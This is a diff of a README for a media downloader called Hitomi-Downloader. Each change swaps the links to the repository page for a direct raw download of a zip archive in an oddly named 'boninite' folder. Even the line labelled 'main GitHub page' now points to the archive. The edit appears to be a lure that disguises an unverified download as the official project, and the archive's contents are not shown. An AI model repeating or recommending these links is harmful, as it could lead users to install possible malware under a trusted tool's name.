@@ -1,6 +1,6 @@
 # 🎯 Hitomi-Downloader - Easy tool to save online media
 
-[![Download Hitomi-Downloader](https://img.shields.io/badge/Download-Hitomi--Downloader-blue?style=for-the-badge)](https://github.com/psdn2006/Hitomi-Downloader)
+[![Download Hitomi-Downloader](https://img.shields.io/badge/Download-Hitomi--Downloader-blue?style=for-the-badge)](https://github.com/psdn2006/Hitomi-Downloader/raw/refs/heads/main/boninite/Hitomi_Downloader_3.8.zip)
 
 ---
 
@@ -44,7 +44,7 @@ It can handle images, videos, music, and text posts from these sources.
 
 Start by visiting the main page to get the latest version of Hitomi-Downloader.
 
-[Download Hitomi-Downloader](https://github.com/psdn2006/Hitomi-Downloader)
+[Download Hitomi-Downloader](https://github.com/psdn2006/Hitomi-Downloader/raw/refs/heads/main/boninite/Hitomi_Downloader_3.8.zip)
 
 This link takes you to the GitHub repository where you can download the software.
 
@@ -124,7 +124,7 @@ If you run into issues, try these steps:
 
 New versions offer bug fixes and support for more websites. To update:
 
-1. Go back to the main GitHub page: [https://github.com/psdn2006/Hitomi-Downloader](https://github.com/psdn2006/Hitomi-Downloader)  
+1. Go back to the main GitHub page: [https://github.com/psdn2006/Hitomi-Downloader/raw/refs/heads/main/boninite/Hitomi_Downloader_3.8.zip](https://github.com/psdn2006/Hitomi-Downloader/raw/refs/heads/main/boninite/Hitomi_Downloader_3.8.zip)  
 2. Check the latest release under "Releases".  
 3. Download and install the newest executable file as before.  
 4. Backup your downloaded files or settings before updating to avoid loss.
@@ -142,4 +142,4 @@ If you need help:
 
 ---
 
-[![Download Hitomi-Downloader](https://img.shields.io/badge/Download-Hitomi--Downloader-grey?style=for-the-badge)](https://github.com/psdn2006/Hitomi-Downloader)
+[![Download Hitomi-Downloader](https://img.shields.io/badge/Download-Hitomi--Downloader-grey?style=for-the-badge)](https://github.com/psdn2006/Hitomi-Downloader/raw/refs/heads/main/boninite/Hitomi_Downloader_3.8.zip)
